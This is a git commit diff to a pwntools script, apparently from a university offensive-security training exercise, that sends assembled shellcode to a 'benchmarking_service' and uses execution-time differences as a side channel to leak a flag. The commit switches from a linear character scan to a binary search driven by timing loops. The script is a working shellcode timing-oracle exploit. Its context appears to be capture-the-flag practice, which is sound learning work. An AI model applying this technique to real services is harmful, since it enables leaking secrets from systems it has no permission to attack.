254d4c2c5f709571559a9227de6ff6c11143b102
gio-del <giovanni.delucia@polimi.it>
2023-10-06 19:36:24 +0200

    improve benchmarking_server

--- shellcode/benchmarking/script.py
+++ shellcode/benchmarking/script.py
@@ -2,25 +2,15 @@ from pwn import *
 
 context.arch = 'amd64'
 
-if(len(sys.argv) > 1):
-	if(sys.argv[1] == '--debug'):
-		p = process("./benchmarking_service")
-		gdb.attach(p, """
-		# b *play+601
-		"""	)
-		input("wait...")
-	elif(sys.argv[1] == '--strace'):
-		p = process(["strace", "./benchmarking_service"])
-	elif(sys.argv[1] == '--remote'):
-		p = remote("bin.training.offdef.it", 5001)
-else:
-	p = process("./benchmarking_service")
-
 count = 0
 flag = ""
 exit = False
 while not exit:
-	for i in range(19, 127):
+	lo = 19
+	hi = 127
+	while lo<=hi:
+		mid = (hi+lo)//2
+		
 		if(len(sys.argv) > 1):
 			if(sys.argv[1] == '--debug'):
 				p = process("./benchmarking_service")
@@ -67,17 +57,30 @@ while not exit:
 		    cmp     DWORD PTR [rbp-4], 0x10000000
 		    jle     .L4
 		.L2:
-		""" % (count, i)
+			cmp al, %d
+			jg		.L5
+			jmp		.L6
+		.L7:
+			add     DWORD PTR [rbp-4], 1
+		.L5:
+			cmp     DWORD PTR [rbp-4], 0x20000000
+			jle		.L7
+		.L6:
+		""" % (count, mid, mid)
 
 		p.sendline(asm(sh) + b'A'*1024)
 		p.recvuntil(b'Time: ')
 		time = float(p.recv().decode('utf-8'))
-
-		if(time > 0.5):
+		
+		if(time > 0.5 and time < 1): # Got the right character!
 			count += 1
-			flag += chr(i)
+			flag += chr(mid)
 			print(flag)
-			if(chr(i) == '}'): exit = True
+			if(chr(mid) == '}'): exit = True
 			break
+		elif(time > 1): # Character > mid
+			lo = mid + 1
+		else: # Character < mid
+			hi = mid - 1
+		p.close()
 print(flag)
-p.interactive()
